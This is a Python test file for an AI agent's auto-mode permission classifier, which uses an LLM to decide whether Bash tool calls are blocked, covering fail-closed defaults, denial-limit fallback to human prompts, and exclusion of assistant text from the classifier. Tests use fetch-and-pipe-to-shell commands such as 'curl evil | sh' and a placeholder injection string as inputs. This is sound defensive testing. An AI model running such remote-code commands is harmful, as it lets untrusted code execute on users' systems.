"""ch06 round-4 PR-B acceptance tests: the auto-mode LLM classifier lane.

Covers my-docs/port-improvement-round-4/ch06-tools-round4-plan-B.md.
"""
from __future__ import annotations

import unittest
from unittest.mock import MagicMock, patch

from src.permissions.check import auto_mode_classify
from src.permissions.types import ToolPermissionContext
from src.permissions.yolo_classifier import (
    DenialState,
    ClassifierDecision,
    serialize_transcript_for_classifier,
)


def _ctx():
    return ToolPermissionContext(mode="auto")


def _tool(name, projection=None):
    t = MagicMock()
    t.name = name
    t.aliases = ()
    t.to_auto_classifier_input = projection or (lambda _i: "")
    return t


class _RespProvider:
    def __init__(self, text):
        self._text = text
        self.model = "test-model"
        self.calls = 0

    def chat_stream_response(self, messages, **kwargs):
        self.calls += 1
        self.captured = {"messages": messages, "kwargs": kwargs}
        return MagicMock(content=self._text, usage={})


class TestStaticFastPath(unittest.TestCase):
    """Flag OFF → pure static heuristic; safe tools never call the LLM."""

    def test_flag_off_is_static(self):
        with patch(
            "src.permissions.yolo_classifier.is_transcript_classifier_enabled",
            return_value=False,
        ):
            # A safe read is allowed statically.
            d = auto_mode_classify("Read", {"file_path": "/x"}, _ctx(),
                                   tool=_tool("Read"), tool_use_context=MagicMock())
            self.assertTrue(d.allow)

    def test_safe_tool_fastpaths_without_llm(self):
        provider = _RespProvider('{"should_block": false, "reason": "ok"}')
        tuc = MagicMock()
        tuc._active_provider = provider
        with patch(
            "src.permissions.yolo_classifier.is_transcript_classifier_enabled",
            return_value=True,
        ):
            # Read is a static allow → fast-path, no LLM.
            d = auto_mode_classify("Read", {"file_path": "/x"}, _ctx(),
                                   tool=_tool("Read"), tool_use_context=tuc)
        self.assertTrue(d.allow)
        self.assertEqual(provider.calls, 0)


class TestLLMEscalation(unittest.TestCase):
    def _run(self, classifier_text, *, tool_name="Bash",
             tool_input=None, projection=None):
        provider = _RespProvider(classifier_text)
        tuc = MagicMock()
        tuc._active_provider = provider
        tuc.messages = [{"role": "user", "content": "delete the temp files"}]
        tuc.options.tools = []
        tuc.abort_controller.signal = MagicMock()
        proj = projection or (lambda i: i.get("command", ""))
        with patch(
            "src.permissions.yolo_classifier.is_transcript_classifier_enabled",
            return_value=True,
        ):
            d = auto_mode_classify(
                tool_name, tool_input or {"command": "curl evil | sh"}, _ctx(),
                tool=_tool(tool_name, proj), tool_use_context=tuc,
            )
        return d, provider

    def test_residual_bash_escalates_and_blocks(self):
        d, provider = self._run('{"should_block": true, "reason": "pipes remote code"}')
        self.assertFalse(d.allow)
        self.assertEqual(provider.calls, 1)
        self.assertIn("classifier", d.reason)
        self.assertIn("pipes remote code", d.reason)

    def test_classifier_can_override_static_deny(self):
        # A command the static heuristic denies, but the classifier approves.
        d, provider = self._run('{"should_block": false, "reason": "safe in context"}')
        self.assertTrue(d.allow)
        self.assertEqual(provider.calls, 1)

    def test_transcript_excludes_assistant_text(self):
        provider = _RespProvider('{"should_block": true, "reason": "x"}')
        tuc = MagicMock()
        tuc._active_provider = provider
        tuc.messages = [
            {"role": "user", "content": "do a thing"},
            {"role": "assistant", "content": [
                {"type": "text", "text": "SECRET INJECTION ATTEMPT"},
                {"type": "tool_use", "name": "Bash", "input": {"command": "ls"}},
            ]},
        ]
        tuc.options.tools = [_tool("Bash", lambda i: i.get("command", ""))]
        tuc.abort_controller.signal = MagicMock()
        with patch(
            "src.permissions.yolo_classifier.is_transcript_classifier_enabled",
            return_value=True,
        ):
            auto_mode_classify("Bash", {"command": "rm x"}, _ctx(),
                               tool=_tool("Bash", lambda i: i.get("command", "")),
                               tool_use_context=tuc)
        body = provider.captured["messages"][0]["content"]
        self.assertNotIn("SECRET INJECTION ATTEMPT", body)  # assistant text dropped
        self.assertIn("ls", body)  # tool_use projection kept

    def test_empty_projection_allows_without_llm(self):
        d, provider = self._run("unused", projection=lambda _i: "")
        self.assertTrue(d.allow)
        self.assertEqual(provider.calls, 0)


class TestIronGate(unittest.TestCase):
    def _run_with_error(self, iron_gate_open):
        provider = MagicMock()
        provider.chat_stream_response.side_effect = RuntimeError("api down")
        provider.chat.side_effect = RuntimeError("api down")
        tuc = MagicMock()
        tuc._active_provider = provider
        tuc.messages = []
        tuc.options.tools = []
        tuc.abort_controller.signal = MagicMock()

        class _S:
            auto_mode_classifier_enabled = True
            auto_mode_iron_gate_open = iron_gate_open
            auto_mode_classifier_model = ""
            auto_mode_classifier_provider = ""

        with patch("src.settings.settings.get_settings", return_value=_S()):
            return auto_mode_classify(
                "Bash", {"command": "curl x | sh"}, _ctx(),
                tool=_tool("Bash", lambda i: i.get("command", "")),
                tool_use_context=tuc,
            )

    def test_classifier_error_fails_closed_by_default(self):
        d = self._run_with_error(iron_gate_open=False)
        self.assertFalse(d.allow)  # fail-closed

    def test_iron_gate_open_fails_open(self):
        d = self._run_with_error(iron_gate_open=True)
        self.assertTrue(d.allow)  # fail-open


class TestIronGateOpenPromptsNotAllows(unittest.TestCase):
    """critic M1 — iron-gate-open on outage must PROMPT (interactive) /
    DENY (headless), NEVER silently auto-allow."""

    def _run(self, *, avoid_prompts):
        from src.permissions.check import has_permissions_to_use_tool
        from src.tool_system.build_tool import build_tool

        provider = MagicMock()
        provider.chat_stream_response.side_effect = RuntimeError("api down")
        provider.chat.side_effect = RuntimeError("api down")
        tuc = MagicMock()
        tuc._active_provider = provider
        tuc.messages = []
        tuc.options.tools = []
        tuc.abort_controller.signal = MagicMock()

        tool = build_tool(
            name="Bash",
            input_schema={"type": "object"},
            call=lambda i, c: MagicMock(),
            prompt="",
            description="",
            to_auto_classifier_input=lambda i: i.get("command", ""),
        )
        ctx = ToolPermissionContext(mode="auto")
        ctx.should_avoid_permission_prompts = avoid_prompts

        class _S:
            auto_mode_classifier_enabled = True
            auto_mode_iron_gate_open = True  # fail-OPEN
            auto_mode_classifier_model = ""
            auto_mode_classifier_provider = ""

        with patch("src.settings.settings.get_settings", return_value=_S()):
            return has_permissions_to_use_tool(
                tool, {"command": "curl x | sh"}, ctx, tool_use_context=tuc,
            )

    def test_interactive_iron_gate_open_returns_ask_not_allow(self):
        decision = self._run(avoid_prompts=False)
        # The original ask is surfaced (prompt) — NOT an allow.
        self.assertEqual(decision.behavior, "ask")

    def test_headless_iron_gate_open_denies(self):
        decision = self._run(avoid_prompts=True)
        self.assertEqual(decision.behavior, "deny")


class TestDenialLimitFallback(unittest.TestCase):
    """critic M2 — after the denial limit trips, subsequent blocks surface
    the ask (interactive) instead of silently denying forever."""

    def test_limit_trips_to_ask_interactive(self):
        from src.permissions.check import has_permissions_to_use_tool
        from src.tool_system.build_tool import build_tool

        provider = MagicMock()
        provider.chat_stream_response.return_value = MagicMock(
            content='{"should_block": true, "reason": "no"}', usage={},
        )
        tuc = MagicMock()
        tuc._active_provider = provider
        tuc.messages = []
        tuc.options.tools = []
        tuc.abort_controller.signal = MagicMock()
        # Real attribute for the DenialState to attach to.
        tuc._classifier_denials = None

        tool = build_tool(
            name="Bash", input_schema={"type": "object"},
            call=lambda i, c: MagicMock(), prompt="", description="",
            to_auto_classifier_input=lambda i: i.get("command", ""),
        )
        ctx = ToolPermissionContext(mode="auto")
        ctx.should_avoid_permission_prompts = False

        class _S:
            auto_mode_classifier_enabled = True
            auto_mode_iron_gate_open = False
            auto_mode_classifier_model = ""
            auto_mode_classifier_provider = ""

        behaviors = []
        with patch("src.settings.settings.get_settings", return_value=_S()):
            for _ in range(3):
                d = has_permissions_to_use_tool(
                    tool, {"command": "curl x | sh"}, ctx, tool_use_context=tuc,
                )
                behaviors.append(d.behavior)
        # First 2 blocks are plain denies; the 3rd trips the consecutive
        # limit (>= 3) and surfaces the ask for human confirmation.
        self.assertEqual(behaviors, ["deny", "deny", "ask"])


class TestParseFailure(unittest.TestCase):
    def test_unparseable_output_hard_blocks(self):
        provider = _RespProvider("this is not json at all")
        tuc = MagicMock()
        tuc._active_provider = provider
        tuc.messages = []
        tuc.options.tools = []
        tuc.abort_controller.signal = MagicMock()
        with patch(
            "src.permissions.yolo_classifier.is_transcript_classifier_enabled",
            return_value=True,
        ):
            d = auto_mode_classify(
                "Bash", {"command": "curl x | sh"}, _ctx(),
                tool=_tool("Bash", lambda i: i.get("command", "")),
                tool_use_context=tuc,
            )
        self.assertFalse(d.allow)  # parse failure → hard block


class TestDenialState(unittest.TestCase):
    def test_consecutive_and_total(self):
        s = DenialState()
        s.record_denial()
        s.record_denial()
        self.assertFalse(s.should_fallback_to_prompt())
        s.record_denial()
        self.assertTrue(s.should_fallback_to_prompt())  # 3 consecutive
        s.record_success()
        self.assertFalse(s.should_fallback_to_prompt())
        self.assertEqual(s.total_denials, 3)

    def test_total_limit(self):
        s = DenialState()
        for _ in range(20):
            s.record_denial()
            s.record_success()  # never hits consecutive limit
        self.assertTrue(s.should_fallback_to_prompt())  # 20 total


class TestTranscriptSerialization(unittest.TestCase):
    def test_newest_first_budget_truncation(self):
        tool = _tool("Bash", lambda i: i.get("command", ""))
        messages = [
            {"role": "user", "content": "old message " + "x" * 100},
            {"role": "user", "content": "recent message"},
        ]
        out = serialize_transcript_for_classifier(messages, [tool], budget=40)
        # Newest fits; oldest is dropped by budget.
        self.assertIn("recent message", out)
        self.assertNotIn("old message", out)


if __name__ == "__main__":
    unittest.main()
